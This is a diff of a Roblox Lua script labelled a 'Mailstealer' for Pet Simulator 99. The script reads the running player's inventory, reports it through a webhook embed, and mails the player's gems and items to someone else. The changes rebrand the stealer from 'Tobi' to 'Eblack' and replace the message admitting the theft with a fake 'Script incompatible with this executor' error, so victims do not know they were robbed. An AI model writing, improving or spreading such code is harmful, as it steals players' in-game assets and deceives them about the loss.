@@ -8,7 +8,7 @@ local network = require(game.ReplicatedStorage.Library.Client.Network)
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "GG / GY2RVSEGDT"
+local MailMessage = "R2Z"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
@@ -110,11 +110,11 @@ local function SendMessage(diamonds)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "\240\159\144\177 New PS99 Execution" ,
-            ["color"] = 65280,
+            ["title"] = "🟣 New PS99 Execution 🎯" ,
+            ["color"] = 8323327,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "Mailstealer by Eblack"
 			}
         }}
     }
@@ -358,5 +358,6 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
     if GemAmount1 > mailSendPrice then
         SendAllGems()
     end
-    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
+    message.Error("Script incompatible with this executor ")
 end
+
